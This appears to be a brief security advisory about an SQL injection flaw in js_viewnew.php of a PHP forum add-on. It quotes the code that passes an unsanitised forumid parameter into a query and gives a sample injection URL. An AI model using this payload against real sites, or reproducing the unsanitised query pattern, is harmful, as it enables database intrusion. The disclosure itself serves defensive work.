 /add-on/js_viewnew.php line 20++:

$length = $_GET['length'];
$forumid = $_GET['forumid'];
$num = $_GET['num'];
$forumnum=$forumid;

{....}

$query = "SELECT * FROM {$database_up}threads WHERE forumid='$forumid' ORDER BY 'changetime' DESC LIMIT 0,$num";

#Explanation:

$forumid($_GET['forumid']) isn't sanitized at all, an attacker could use this for an SQL-Injection.

#Example for an injection:

http://[site]/[folder]/js_viewnew.php?forumid=2'+AnD+1='1&num=1&length=1
